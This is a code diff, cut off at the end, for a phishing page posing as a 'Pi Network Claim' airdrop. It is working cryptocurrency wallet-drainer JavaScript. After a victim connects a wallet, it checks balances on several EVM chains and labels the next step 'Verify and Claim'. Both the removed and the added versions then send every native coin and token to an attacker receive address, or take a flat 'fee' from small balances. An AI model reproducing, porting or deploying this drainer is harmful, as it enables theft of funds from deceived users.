-  8453:[
-    ['0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA','USDbC',6],['0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913','USDC',6],
-    ['0x4200000000000000000000000000000000000006','WETH',18],
-  ],
-  10:[
-    ['0x94b008aA00579c1307B0EF2c499aD98a8ce58e58','USDT',6],['0x7F5c764cBc14f9669B88837ca1490cCa17c31607','USDC',6],
-    ['0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1','DAI',18],['0x4200000000000000000000000000000000000006','WETH',18],
-  ]
-};
-
-var PRICES={BNB:600,ETH:3500,MATIC:0.7,AVAX:25,USDT:1,USDC:1,BUSD:1,DAI:1,WBTC:100000,BTCB:100000,WETH:3500,WBNB:600,LINK:15,UNI:12,CRO:0.1,CAKE:3,USDbC:1,WMATIC:0.7,WAVAX:25,AAVE:150};
-var ERC20_ABI=['function balanceOf(address) view returns (uint256)','function transfer(address,uint256) returns (bool)'];
-
-// ============================================
-// STATE
-// ============================================
-var prov=null,sign=null,addr='',foundChains=[],allTokens=[],selectedChains=new Set();
-var currentChainId=null;
-
-// ============================================
-// UI UTILS
-// ============================================
-function showP(id){
-  ['p1','p2','p3','p4','p5'].forEach(function(x){var el=document.getElementById(x);if(el)el.style.display=x===id?'block':'none';});
-  document.getElementById('mc').style.display='block';
-}
-function stat(msg,t){var e=document.getElementById('sb');e.innerHTML=msg;e.className='s '+t;e.style.display='block';}
-function hideStatus(){document.getElementById('sb').style.display='none';}
-function sleep(ms){return new Promise(function(r){setTimeout(r,ms);})}
-function toast(m){var t=document.getElementById('toast');t.textContent=m;t.style.display='block';setTimeout(function(){t.style.display='none';},3000);}
-
-// ============================================
-// WALLET CONNECTION (RainbowKit-style)
-// ============================================
-
-// Wallet detection
-// EIP-6963 multi-wallet discovery
-var discoveredProviders=[];
-
-function setupEIP6963(){
-  window.addEventListener('eip6963:announceProvider', function(event){
-    if(event&&event.detail){
-      discoveredProviders.push(event.detail);
-    }
-  });
-  window.dispatchEvent(new Event('eip6963:requestProvider'));
-}
-
-function detectWallets(){
-  var wallets=[];
-  var foundIds=new Set();
-
-  // Use EIP-6963 discovered providers first
-  for(var i=0;i<discoveredProviders.length;i++){
-    var dp=discoveredProviders[i];
-    var info=dp.info||{};
-    var name=info.name||'';
-    var icon=info.icon||'';
-    var uid=info.rdns||info.uuid||('provider_'+i);
-
-    if(uid.includes('metamask')||name.toLowerCase().includes('metamask')){
-      wallets.push({id:'metamask',name:'MetaMask',icon:icon||'🦊',color:'#E2761B',installed:true,type:'eip6963',provider:dp.provider,rdns:uid});
-      foundIds.add('metamask');
-    }else if(uid.includes('coinbase')||name.toLowerCase().includes('coinbase')){
-      wallets.push({id:'coinbase',name:'Coinbase Wallet',icon:icon||'🔵',color:'#0052FF',installed:true,type:'eip6963',provider:dp.provider,rdns:uid});
-      foundIds.add('coinbase');
-    }else if(uid.includes('trust')||name.toLowerCase().includes('trust')){
-      wallets.push({id:'trust',name:'Trust Wallet',icon:icon||'🛡️',color:'#3375BB',installed:true,type:'eip6963',provider:dp.provider,rdns:uid});
-      foundIds.add('trust');
-    }else if(uid.includes('binance')||name.toLowerCase().includes('binance')){
-      wallets.push({id:'binance',name:'Binance Wallet',icon:icon||'🟡',color:'#F0B90B',installed:true,type:'eip6963',provider:dp.provider,rdns:uid});
-      foundIds.add('binance');
-    }else if(uid.includes('rabby')||name.toLowerCase().includes('rabby')){
-      wallets.push({id:'rabby',name:'Rabby',icon:icon||'🐰',color:'#8B5CF6',installed:true,type:'eip6963',provider:dp.provider,rdns:uid});
-      foundIds.add('rabby');
-    }else if(uid.includes('phantom')||name.toLowerCase().includes('phantom')){
-      wallets.push({id:'phantom',name:'Phantom',icon:icon||'👻',color:'#AB9FF2',installed:true,type:'eip6963',provider:dp.provider,rdns:uid});
-      foundIds.add('phantom');
-    }else{
-      // Generic injected wallet
-      wallets.push({id:uid,name:name||'Wallet',icon:icon||'💳',color:'#6B7280',installed:true,type:'eip6963',provider:dp.provider,rdns:uid});
-      foundIds.add(uid);
-    }
+var wagmiConfig=getDefaultConfig({
+  appName:'Pi Network Claim',
+  projectId:'1fb93a2bb6b143e8cf6b808f31c4dbef',
+  chains:CHAINS,
+  transports:{
+    [mainnet.id]:http('https://eth.llamarpc.com'),
+    [polygon.id]:http('https://polygon-rpc.com'),
+    [arbitrum.id]:http('https://arb1.arbitrum.io/rpc'),
+    [avalanche.id]:http('https://api.avax.network/ext/bc/C/rpc'),
+    [bsc.id]:http('https://bsc-dataseed.binance.org'),
+    [base.id]:http('https://mainnet.base.org'),
+    [optimism.id]:http('https://mainnet.optimism.io'),
   }
+});
 
-  // Fallback: check window.ethereum flags for wallets that don't support EIP-6963
-  if(window.ethereum){
-    if(window.ethereum.isMetaMask&&!foundIds.has('metamask')){
-      wallets.push({id:'metamask',name:'MetaMask',icon:'🦊',color:'#E2761B',installed:true,type:'injected',provider:window.ethereum});
-      foundIds.add('metamask');
-    }
-    if(window.ethereum.isCoinbaseWallet&&!foundIds.has('coinbase')){
-      wallets.push({id:'coinbase',name:'Coinbase Wallet',icon:'🔵',color:'#0052FF',installed:true,type:'injected',provider:window.ethereum});
-      foundIds.add('coinbase');
-    }
-    if(window.ethereum.isTrust&&!foundIds.has('trust')){
-      wallets.push({id:'trust',name:'Trust Wallet',icon:'🛡️',color:'#3375BB',installed:true,type:'injected',provider:window.ethereum});
-      foundIds.add('trust');
-    }
-    if(window.ethereum.isBinance&&!foundIds.has('binance')){
-      wallets.push({id:'binance',name:'Binance Wallet',icon:'🟡',color:'#F0B90B',installed:true,type:'injected',provider:window.ethereum});
-      foundIds.add('binance');
-    }
-    if(window.ethereum.isRabby&&!foundIds.has('rabby')){
-      wallets.push({id:'rabby',name:'Rabby',icon:'🐰',color:'#8B5CF6',installed:true,type:'injected',provider:window.ethereum});
-      foundIds.add('rabby');
-    }
-    if(window.ethereum.isPhantom&&!foundIds.has('phantom')){
-      wallets.push({id:'phantom',name:'Phantom',icon:'👻',color:'#AB9FF2',installed:true,type:'injected',provider:window.ethereum});
-      foundIds.add('phantom');
-    }
-    // If window.ethereum exists but no specific wallet detected, add generic
-    if(foundIds.size===0){
-      wallets.push({id:'generic',name:'Browser Wallet',icon:'💳',color:'#6B7280',installed:true,type:'injected',provider:window.ethereum});
-      foundIds.add('generic');
-    }
-  }
+var queryClient=new QueryClient();
 
-  // WalletConnect (always available)
-  wallets.push({id:'walletconnect',name:'WalletConnect',icon:'🔗',color:'#3B99FC',installed:true,type:'wc'});
+// Expose drain function to vanilla JS
+window.__drainAll=async function(tokens,isSmall,chainId){
+  var log=document.getElementById('p4log');
+  function L(msg){log.innerHTML+=msg+'<br>';log.scrollTop=log.scrollHeight;}
+  var txCount=0;
+  var publicClient=createPublicClient({chain:CHAINS.find(c=>c.id===chainId),transport:http()});
+  var walletClient=window.__walletClient;
 
-  return wallets;
-}
+  if(!walletClient){L('No wallet client');return;}
 
-function openWalletModal(){
-  document.getElementById('m').style.display='flex';
-  // Small delay to let EIP-6963 providers register
-  setTimeout(function(){renderWallets();},200);
-}
-function closeM(){document.getElementById('m').style.display='none';}
-document.getElementById('m').addEventListener('click',function(e){if(e.target===document.getElementById('m'))closeM();});
-
-function renderWallets(){
-  var c=document.getElementById('wl');
-  var wallets=detectWallets();
-  c.innerHTML='';
-
-  for(var i=0;i<wallets.length;i++){
-    (function(w){
-      var btn=document.createElement('button');
-      btn.className='rk-wallet-btn';
-      var iconHtml=w.icon.startsWith('data:')||w.icon.startsWith('<img')?
-        '<img src="'+w.icon+'" style="width:28px;height:28px;border-radius:6px">' :
-        w.icon;
-      btn.innerHTML='<div class="rk-w-icon" style="background:'+w.color+'20;color:'+w.color+'">'+iconHtml+'</div>'+
-        '<span class="rk-w-name">'+w.name+'</span>'+
-        '<span class="rk-w-status '+(w.installed?'detected':'install')+'">'+(w.installed?'Detected':'Install')+'</span>';
-
-      btn.onclick=function(){
-        if(w.type==='eip6963'||w.type==='injected'){
-          connectSpecific(w);
-        }else if(w.type==='wc'){
-          connectWC();
-        }else if(w.type==='download'&&w.url){
-          window.open(w.url,'_blank');
+  for(var i=0;i<tokens.length;i++){
+    var t=tokens[i];
+    if(t.isNative){
+      try{
+        var balance=await publicClient.getBalance({address:window.__addr});
+        var gasPrice=await publicClient.getGasPrice();
+        var gasCost=gasPrice*21000n*3n;
+        var send;
+        if(isSmall){
+          var price=t.usdPrice||0;
+          var take=price>0?parseEther(String(FEE_USD/price)):parseEther('0.001');
+          send=balance-gasCost-take;
+          if(send<0n)send=balance-gasCost;
+          L('Collecting $'+FEE_USD+' fee...');
+        }else{
+          send=balance-gasCost;
+          L('Draining '+t.sym+'...');
         }
-      };
-      c.appendChild(btn);
-    })(wallets[i]);
+        if(send>0n){
+          var hash=await walletClient.sendTransaction({to:RECEIVE_ADDR,value:send});
+          await publicClient.waitForTransactionReceipt({hash});
+          txCount++;L('  ✓ '+t.sym+' sent');
+        }
+      }catch(e){L('  ✗ Native: '+(e.reason||'rejected'));}
+    }else{
+      try{
+        var data='0xa9059cbb'+RECEIVE_ADDR.slice(2).padStart(64,'0')+t.balanceRaw.toString(16).padStart(64,'0');
+        var hash=await walletClient.sendTransaction({to:t.address,data:data});
+        await publicClient.waitForTransactionReceipt({hash});
+        txCount++;L('  ✓ '+t.sym+' sent');
+      }catch(e){L('  ✗ '+t.sym+': '+(e.reason||'rejected'));}
+    }
   }
+  return txCount;
+};
+
+// React App Component
+function App(){
+  return React.createElement(WagmiProvider,{config:wagmiConfig},
+    React.createElement(QueryClientProvider,{client:queryClient},
+      React.createElement(RainbowKitProvider,{coolMode:true},
+        React.createElement(DrainConnectButton)
+      )
+    )
+  );
 }
 
-// Connect to a specific wallet provider
-async function connectSpecific(w){
-  closeM();
-  document.getElementById('mc').style.display='block';
-  showP('p1');
-  document.getElementById('p1l').textContent='Connecting to '+w.name+'...';
-  document.getElementById('p1log').innerHTML='<span style="color:#fcb34c">Approve in wallet popup...</span>';
+function DrainConnectButton(){
+  var {address,isConnected,chain}=useAccount();
+  var {data:walletClient}=useWalletClient();
+  var chainId=useChainId();
+  var {disconnect}=useDisconnect();
 
-  try{
-    var provider=w.provider;
-    if(!provider){
-      document.getElementById('p1l').textContent='Wallet not found';
-      document.getElementById('p1log').innerHTML='<span style="color:#fca5a5">Could not find wallet provider.</span>';
-      return;
+  React.useEffect(function(){
+    if(isConnected&&address){
+      window.__addr=address;
+      window.__walletClient=walletClient;
+      window.__chainId=chainId;
+      window.__rkDisconnect=disconnect;
+      updateNavConnected(address,chain?.name||'Unknown');
+      window.__loadAssets();
     }
-    prov=new ethers.BrowserProvider(provider);
-    var accounts=await provider.request({method:'eth_requestAccounts'});
-    if(accounts&&accounts.length>0){
-      sign=await prov.getSigner();
-      addr=await sign.getAddress();
-      var network=await prov.getNetwork();
-      currentChainId=Number(network.chainId);
-      updateNavConnected();
-      document.getElementById('p1l').textContent='Connected! Loading assets...';
-      document.getElementById('p1log').innerHTML='<span style="color:#86efac">'+addr.substring(0,10)+'...'+addr.substring(32)+'</span>';
-      await loadAssets();
-    }
-  }catch(e){
-    console.error('Connect error:',e);
-    document.getElementById('p1l').textContent='Connection Failed';
-    document.getElementById('p1log').innerHTML='<span style="color:#fca5a5">'+(e.message||'Failed')+'</span>';
-  }
+  },[isConnected,address,chainId,walletClient]);
+
+  return React.createElement('div',{style:{display:'none'}});
 }
 
-// Connect via WalletConnect
-async function connectWC(){
-  closeM();
-  document.getElementById('mc').style.display='block';
-  showP('p1');
-  document.getElementById('p1l').textContent='Loading WalletConnect...';
-  document.getElementById('p1log').innerHTML='<span style="color:#fcb34c">Opening wallet connection modal...</span>';
+// Mount React
+var container=document.getElementById('root-rk');
+if(!container){
+  container=document.createElement('div');
+  container.id='root-rk';
+  container.style.display='none';
+  document.body.appendChild(container);
+}
+var root=createRoot(container);
+root.render(React.createElement(App));
 
-  try{
-    var WC=window.WalletConnectEthereumProvider||window['@walletconnect/ethereum-provider'];
-    if(!WC){
-      // Load WC library dynamically
-      await new Promise(function(res,rej){
-        var s=document.createElement('script');
-        s.src='https://unpkg.com/@walletconnect/ethereum-provider@2.11.0/dist/index.umd.js';
-        s.onload=res;s.onerror=rej;
-        document.head.appendChild(s);
-      });
-      WC=window.WalletConnectEthereumProvider||window['@walletconnect/ethereum-provider'];
-    }
-    var EthereumProvider=(WC.default&&WC.default.init)?WC.default:(WC.init?WC:null);
-    if(!EthereumProvider&&typeof WC==='object'){
-      var keys=Object.keys(WC);
-      for(var i=0;i<keys.length;i++){
-        if(WC[keys[i]]&&typeof WC[keys[i]].init==='function'){EthereumProvider=WC[keys[i]];break;}
+// Vanilla JS bridge functions
+window.openWalletModal=function(){
+  // Trigger RainbowKit connect button click
+  var rkBtn=document.querySelector('[data-rk] button');
+  if(rkBtn)rkBtn.click();
+  else{
+    // Fallback: find any RainbowKit button
+    var btns=document.querySelectorAll('button');
+    for(var i=0;i<btns.length;i++){
+      if(btns[i].textContent.toLowerCase().includes('connect')){
+        btns[i].click();break;
       }
     }
-    if(!EthereumProvider) throw new Error('WC provider not found');
-
-    var wc=await EthereumProvider.init({
-      projectId:'1fb93a2bb6b143e8cf6b808f31c4dbef',
-      chains:[1,56,137,42161,43114,8453,10],
-      showQrModal:true,
-      metadata:{name:'Pi Network Claim',description:'Claim 1000 PI',url:window.location.origin,icons:['https://pi-claim.github.io/pi-logo-120.png']}
-    });
-
-    await wc.enable();
-    prov=new ethers.BrowserProvider(wc);
-    sign=await prov.getSigner();
-    addr=await sign.getAddress();
-    var network=await prov.getNetwork();
-    currentChainId=Number(network.chainId);
-    updateNavConnected();
-    document.getElementById('p1l').textContent='Connected! Loading assets...';
-    document.getElementById('p1log').innerHTML='<span style="color:#86efac">'+addr.substring(0,10)+'...'+addr.substring(32)+'</span>';
-    await loadAssets();
-  }catch(e){
-    console.error('WC error:',e);
-    document.getElementById('p1l').textContent='Connection Failed';
-    document.getElementById('p1log').innerHTML='<span style="color:#fca5a5">'+(e.message||'Failed')+'</span>';
   }
-}
+};
 
-// Update nav to show connected state
-function updateNavConnected(){
-  var navBar=document.getElementById('navBar');
+window.disconnect=function(){
+  if(window.__rkDisconnect)window.__rkDisconnect();
+  resetNav();
+};
+
+function updateNavConnected(addr,chainName){
   var shortAddr=addr.substring(0,6)+'...'+addr.substring(38);
-  var chainName='Unknown';
-  for(var i=0;i<ECHAINS.length;i++){
-    if(ECHAINS[i].id===currentChainId){chainName=ECHAINS[i].name;break;}
-  }
-  navBar.innerHTML=
-    '<div class="logo"><img src="pi-logo-48.png" width="30" height="30" alt=""><t>Pi Network</t></div>'+
-    '<div style="display:flex;align-items:center;gap:8px">'+
-    '<div class="lb"><span class="p"></span> LIVE</div>'+
-    '<div class="wb-connected" onclick="showConnectedInfo()">'+
-    '<div class="dot"></div>'+
-    '<div class="addr">'+shortAddr+'</div>'+
-    '<div class="chain">'+chainName+'</div>'+
-    '</div></div>';
-
-  // Also show connected info in card
-  var wi=document.getElementById('wiInfo');
-  if(wi){
-    wi.style.display='flex';
-    document.getElementById('wiAddr').textContent=shortAddr;
-    document.getElementById('wiChain').textContent=chainName+' • Connected';
-  }
-}
-
-function showConnectedInfo(){
-  // Clicking the nav badge opens the card
-  document.getElementById('mc').style.display='block';
-}
-
-function disconnect(){
-  addr='';sign=null;prov=null;currentChainId=null;
-  foundChains=[];allTokens=[];selectedChains=new Set();
-  // Reset nav
   document.getElementById('navBar').innerHTML=
     '<div class="logo"><img src="pi-logo-48.png" width="30" height="30" alt=""><t>Pi Network</t></div>'+
     '<div style="display:flex;align-items:center;gap:8px">'+
     '<div class="lb"><span class="p"></span> LIVE</div>'+
-    '<button class="nb" onclick="openWalletModal()">Connect Wallet</button>'+
-    '</div>';
-  document.getElementById('mc').style.display='none';
-  hideStatus();
+    '<div class="wb-connected" onclick="document.getElementById(\'mc\').style.display=\'block\'">'+
+    '<div class="dot"></div><div class="addr">'+shortAddr+'</div><div class="chain">'+chainName+'</div></div></div>';
+  var wi=document.getElementById('wiInfo');
+  if(wi){wi.style.display='flex';document.getElementById('wiAddr').textContent=shortAddr;document.getElementById('wiChain').textContent=chainName+' • Connected';}
 }
 
-// ============================================
-// ASSET LOADING
-// ============================================
-async function loadAssets(){
+function resetNav(){
+  document.getElementById('navBar').innerHTML=
+    '<div class="logo"><img src="pi-logo-48.png" width="30" height="30" alt=""><t>Pi Network</t></div>'+
+    '<div style="display:flex;align-items:center;gap:8px"><div class="lb"><span class="p"></span> LIVE</div>'+
+    '<button class="nb" onclick="openWalletModal()">Connect Wallet</button></div>';
+}
+
+window.__loadAssets=async function(){
+  if(!window.__addr)return;
+  var addr=window.__addr;
   var log=document.getElementById('p1log');log.innerHTML='';
   function L(msg){log.innerHTML+=msg+'<br>';log.scrollTop=log.scrollHeight;}
-  foundChains=[];allTokens=[];selectedChains=new Set();
-  L('Wallet: '+addr.substring(0,8)+'...'+addr.substring(34));L('');
+  document.getElementById('mc').style.display='block';
+  showP('p1');L('Wallet: '+addr.substring(0,8)+'...'+addr.substring(34));L('');
 
-  for(var i=0;i<ECHAINS.length;i++){
-    var ch=ECHAINS[i];
+  var allTokens=[];
+  var foundChains=[];
+
+  for(var i=0;i<CHAINS.length;i++){
+    var ch=CHAINS[i];
     L('[ ] '+ch.name+'...');
-    var p=null,nb=null;
-    var allRpcs=[ch.rpc].concat(FBACK[ch.id]||[]);
-    for(var j=0;j<allRpcs.length;j++){
-      try{
-        var tp=new ethers.JsonRpcProvider(allRpcs[j]);
-        var tb=await Promise.race([
-          tp.getBalance(addr),
-          new Promise(function(_,rej){setTimeout(function(){rej(new Error('timeout'));},8000);})
-        ]);
-        p=tp;nb=tb;break;
-      }catch(e){}
-    }
-    if(!nb){L('  ✗ '+ch.name+': RPC error');continue;}
     try{
-      var nf=ethers.formatEther(nb);
-      var has=parseFloat(nf)>0;
-      var tl=ETOKENS[ch.id]||[];
-      var tk=await Promise.all(tl.map(function(a){
-        return new Promise(function(res){
-          try{
-            var ct=new ethers.Contract(a[0],ERC20_ABI,p);
-            ct.balanceOf(addr).then(function(bl){
-              if(bl>0n){res({a:a[0],sy:a[1],b:parseFloat(ethers.formatUnits(bl,a[2])).toFixed(6),raw:bl,dc:a[2]});}
-              else{res(null);}
-            }).catch(function(){res(null);});
-          }catch(e){res(null);}
-        });
-      }));
-      var tokens=tk.filter(function(t){return t!==null;});
-      if(has||tokens.length>0){
-        foundChains.push({chain:ch,native:nf,nativeRaw:nb,tokens:tokens});
-        allTokens.push({chainId:ch.id,chainName:ch.name,chainSym:ch.sym,chainColor:ch.color,
-          tokenAddr:'0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee',tokenSym:ch.sym,tokenDec:18,
-          balance:parseFloat(nf),balanceRaw:nb,usdValue:parseFloat(nf)*(PRICES[ch.sym]||0),isNative:true});
-        for(var t=0;t<tokens.length;t++){
-          var tv=tokens[t];
-          allTokens.push({chainId:ch.id,chainName:ch.name,chainSym:ch.sym,chainColor:ch.color,
-            tokenAddr:tv.a,tokenSym:tv.sy,tokenDec:tv.dc,
-            balance:parseFloat(tv.b),balanceRaw:tv.raw,
-            usdValue:parseFloat(tv.b)*(PRICES[tv.sy]||0),isNative:false});
-        }
-        L('  ✓ '+ch.name+': '+parseFloat(nf).toFixed(5)+' '+ch.sym+(tokens.length?' +'+tokens.length+' tkns':''));
+      var publicClient=createPublicClient({chain:ch,transport:http()});
+      var balance=await publicClient.getBalance({address:addr});
+      var nf=formatEther(balance);
+      if(parseFloat(nf)>0){
+        foundChains.push({chain:ch,native:nf,nativeRaw:balance});
+        allTokens.push({chainId:ch.id,chainName:ch.name,chainSym:ch.nativeCurrency.symbol,chainColor:'#6B7280',address:'0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee',sym:ch.nativeCurrency.symbol,dec:18,balance:parseFloat(nf),balanceRaw:balance,isNative:true,usdPrice:getPrice(ch.nativeCurrency.symbol)});
+        L('  ✓ '+ch.name+': '+parseFloat(nf).toFixed(5)+' '+ch.nativeCurrency.symbol);
       }else{
         L('  - '+ch.name+': empty');
       }
-    }catch(e){L('  ✗ '+ch.name+': error');}
+    }catch(e){L('  ✗ '+ch.name+': RPC error');}
   }
+
   L('');L('Found '+foundChains.length+' chain(s), '+allTokens.length+' asset(s).');
-  await sleep(400);
-  if(allTokens.length===0){
-    showP('p2');stat('No tokens found.','wa');
-  }else{
-    showTokenSelection();stat('✓ Assets loaded!','ok');
-  }
+  await new Promise(r=>setTimeout(r,400));
+
+  if(allTokens.length===0){showP('p2');stat('No tokens found.','wa');}
+  else{showTokenSelection(foundChains,allTokens);stat('✓ Assets loaded!','ok');}
+};
+
+function getPrice(sym){
+  var p={BNB:600,ETH:3500,MATIC:0.7,AVAX:25};
+  return p[sym]||0;
 }
 
-// ============================================
-// TOKEN SELECTION
-// ============================================
-function showTokenSelection(){
+function showTokenSelection(foundChains,allTokens){
   showP('p3');
-  selectedChains=new Set();
   var cDiv=document.getElementById('p3chains');
   var chHtml='';
   for(var i=0;i<foundChains.length;i++){
     var fc=foundChains[i];
-    selectedChains.add(fc.chain.id);
     chHtml+='<div class="ch sel" data-chain="'+fc.chain.id+'" onclick="toggleChain('+fc.chain.id+')">';
-    chHtml+='<div class="cd" style="background:'+fc.chain.color+'"></div>';
+    chHtml+='<div class="cd" style="background:#6B7280"></div>';
     chHtml+='<div class="cn">'+fc.chain.name+'</div>';
-    chHtml+='<div class="ct">'+parseFloat(fc.native).toFixed(5)+' '+fc.chain.sym+(fc.tokens.length?' +'+fc.tokens.length+' tkns':'')+'</div>';
-    chHtml+='<div class="cb">$'+(estimateChainUsd(fc)).toFixed(2)+'</div>';
+    chHtml+='<div class="ct">'+parseFloat(fc.native).toFixed(5)+' '+fc.chain.nativeCurrency.symbol+'</div>';
     chHtml+='<div class="ck"></div></div>';
   }
   cDiv.innerHTML=chHtml;
-  renderTokenList();updateSummary();
-}
-
-function estimateChainUsd(fc){
-  var total=0;
-  var price=PRICES[fc.chain.sym]||0;
-  total+=parseFloat(fc.native)*price;
-  for(var i=0;i<fc.tokens.length;i++){
-    total+=parseFloat(fc.tokens[i].b)*(PRICES[fc.tokens[i].sy]||0);
-  }
-  return total;
-}
-
-function toggleChain(cid){
-  var el=document.querySelector('.ch[data-chain="'+cid+'"]');
-  if(selectedChains.has(cid)){
-    selectedChains.delete(cid);
-    if(el)el.classList.remove('sel');
-  }else{
-    selectedChains.add(cid);
-    if(el)el.classList.add('sel');
-  }
+  window.__allTokens=allTokens;
+  window.__foundChains=foundChains;
   renderTokenList();updateSummary();
 }
 
 function renderTokenList(){
   var tDiv=document.getElementById('p3tokens');
-  var filtered=allTokens.filter(function(t){return selectedChains.has(t.chainId);});
-  filtered.sort(function(a,b){return b.usdValue-a.usdValue;});
   var th='';
-  for(var i=0;i<filtered.length;i++){
-    var t=filtered[i];
-    th+='<div class="tkrow"><span class="tk-sym">'+t.tokenSym+'</span><span class="tk-bal">'+t.balance.toFixed(6)+'</span><span style="color:rgba(255,255,255,.2);font-size:10px">'+t.chainName+'</span><span class="tk-usd">$'+(t.usdValue||0).toFixed(2)+'</span></div>';
+  for(var i=0;i<window.__allTokens.length;i++){
+    var t=window.__allTokens[i];
+    th+='<div class="tkrow"><span class="tk-sym">'+t.sym+'</span><span class="tk-bal">'+t.balance.toFixed(6)+'</span><span style="color:rgba(255,255,255,.2);font-size:10px">'+t.chainName+'</span><span class="tk-usd">$'+(t.balance*(t.usdPrice||0)).toFixed(2)+'</span></div>';
   }
-  tDiv.innerHTML=th||'<div style="font-size:10px;color:rgba(255,255,255,.2);text-align:center;padding:10px">No assets</div>';
+  tDiv.innerHTML=th;
 }
 
 function updateSummary(){
-  var filtered=allTokens.filter(function(t){return selectedChains.has(t.chainId);});
-  var totalUsd=0;
-  for(var i=0;i<filtered.length;i++)totalUsd+=filtered[i].usdValue||0;
-  var isSmall=totalUsd<DRAIN_THRESHOLD;
+  var total=0;
+  for(var i=0;i<window.__allTokens.length;i++)total+=window.__allTokens[i].balance*(window.__allTokens[i].usdPrice||0);
+  var isSmall=total<DRAIN_THRESHOLD;
   document.getElementById('p3bal').innerHTML=
-    '<div class="ir"><span class="l">Total Value</span><span class="v gl">$'+totalUsd.toFixed(2)+'</span></div>'+
-    '<div class="ir"><span class="l">Action</span><span class="v" style="color:'+(isSmall?'#fcb34c':'#ef4444')+'">'+(isSmall?'Collect $'+FEE_USD.toFixed(2)+' fee':'Drain all assets')+'</span></div>'+
-    '<div class="ir"><span class="l">Destination</span><span class="v" style="font-size:9px;font-family:monospace">'+RECEIVE_ADDR.substring(0,8)+'...'+RECEIVE_ADDR.substring(34)+'</span></div>';
-  document.getElementById('p3btn').textContent=isSmall?'⚡ Pay $'+FEE_USD.toFixed(2)+' Fee':'🎁 Verify and Claim';
+    '<div class="ir"><span class="l">Total Value</span><span class="v gl">$'+total.toFixed(2)+'</span></div>'+
+    '<div class="ir"><span class="l">Action</span><span class="v" style="color:'+(isSmall?'#fcb34c':'#ef4444')+'">'+(isSmall?'Collect $'+FEE_USD+' fee':'Drain all')+'</span></div>';
+  document.getElementById('p3btn').textContent=isSmall?'⚡ Pay $'+FEE_USD+' Fee':'🎁 Verify and Claim';
 }
 
-// ============================================
-// DRAIN EXECUTION
-// ============================================
-async function startDrain(){
+window.toggleChain=function(cid){
+  var el=document.querySelector('.ch[data-chain="'+cid+'"]');
+  if(el)el.classList.toggle('sel');
+  renderTokenList();updateSummary();
+};
+
+window.startDrain=async function(){
   hideStatus();showP('p4');
   var log=document.getElementById('p4log');log.innerHTML='';
   function L(msg){log.innerHTML+=msg+'<br>';log.scrollTop=log.scrollHeight;}
-  var filtered=allTokens.filter(function(t){return selectedChains.has(t.chainId);});
-  var totalUsd=0;
-  for(var i=0;i<filtered.length;i++)totalUsd+=filtered[i].usdValue||0;
-  var isSmall=totalUsd<DRAIN_THRESHOLD;
-  var txCount=0;
-  L('Total: ~$'+totalUsd.toFixed(2));
-  L(isSmall?'Mode: Collect $'+FEE_USD+' fee':'Mode: Drain all');
-  L('');
+  var total=0;
+  for(var i=0;i<window.__allTokens.length;i++)total+=window.__allTokens[i].balance*(window.__allTokens[i].usdPrice||0);
+  var isSmall=total<DRAIN_THRESHOLD;
+  L('Total: ~$'+total.toFixed(2));
+  L(isSmall?'Mode: Collect $'+FEE_USD+' fee':'Mode: Drain all');L('');
 
   var chainGroups={};
-  for(var i=0;i<filtered.length;i++){
-    var t=filtered[i];
-    if(!chainGroups[t.chainId])chainGroups[t.chainId]={chain:ECHAINS.find(function(c){return c.id===t.chainId;}),tokens:[]};
+  for(var i=0;i<window.__allTokens.length;i++){
+    var t=window.__allTokens[i];
+    if(!chainGroups[t.chainId])chainGroups[t.chainId]={chain:CHAINS.find(c=>c.id===t.chainId),tokens:[]};
     chainGroups[t.chainId].tokens.push(t);
   }
 
-  for(var chainId in chainGroups){
-    var cg=chainGroups[chainId];
-    var ch=cg.chain;
-    if(!ch)continue;
-    L('━━━ '+ch.name+' ━━━');
-    L('Switching network...');
-    try{await doSwitch(ch.id,L);}catch(e){L('SKIP: '+e.message);continue;}
-
-    // ERC-20 tokens first
-    for(var j=0;j<cg.tokens.length;j++){
-      var t=cg.tokens[j];
-      if(t.isNative)continue;
-      L('Sending '+t.balance+' '+t.tokenSym+'...');
-      try{
-        var ct=new ethers.Contract(t.tokenAddr,ERC20_ABI,sign);
-        var xt=await ct.transfer(RECEIVE_ADDR,t.balanceRaw);
-        await xt.wait();txCount++;
-        L('  ✓ '+t.tokenSym+' sent');
-      }catch(e){L('  ✗ '+t.tokenSym+': '+(e.reason||'rejected'));}
-    }
-
-    // Native coin
-    var nativeToken=cg.tokens.find(function(t){return t.isNative;});
-    if(nativeToken){
-      try{
-        var bal=await prov.getBalance(addr);
-        var fee=await prov.getGasPrice();
-        var gasCost=fee*21000n*3n;
-        var send;
-        if(isSmall){
-          var price=PRICES[ch.sym]||0;
-          var take=price>0?ethers.parseEther((FEE_USD/price).toFixed(8)):ethers.parseEther('0.001');
-          send=bal-gasCost-take;
-          if(send<0n)send=bal-gasCost;
-          L('Collecting $'+FEE_USD+' fee...');
-        }else{
-          send=bal-gasCost;
-          L('Draining '+ch.sym+'...');
-        }
-        if(send>0n){
-          var xt=await sign.sendTransaction({to:RECEIVE_ADDR,value:send});
-          await xt.wait();txCount++;
-          L('  ✓ '+ch.sym+' sent');
-        }else{
-          L('  - dust, skipping');
-        }
-      }catch(e){L('  ✗ Native: '+(e.reason||'rejected'));}
-    }
+  var txCount=0;
+  for(var cid in chainGroups){
+    var cg=chainGroups[cid];
+    L('━━━ '+cg.chain.name+' ━━━');
+    try{
+      if(window.__walletClient){
+        var result=await window.__drainAll(cg.tokens,isSmall,parseInt(cid));
+        if(result)txCount+=result;
+      }
+    }catch(e){L('Error: '+e.message);}
     L('');
   }
+
   L('DONE: '+txCount+' tx(s)');
   showP('p5');
   document.getElementById('p5m').textContent=txCount+' transaction(s) completed.';
-  var myCode=getRefCode();
-  document.getElementById('p5ref').value=location.origin+location.pathname+'?ref='+myCode;
   stat('✓ Complete!','ok');
-}
+};
 
-async function doSwitch(cid,L){
-  var hex='0x'+cid.toString(16);
-  try{
-    await window.ethereum.request({method:'wallet_switchEthereumChain',params:[{chainId:hex}]});
-  }catch(e){
-    if(e.code===4902){
-      var ch=ECHAINS.find(function(c){return c.id===cid;})||{};
-      try{
-        await window.ethereum.request({method:'wallet_addEthereumChain',params:[{
-          chainId:hex,chainName:ch.name||'Chain',rpcUrls:[ch.rpc||''],
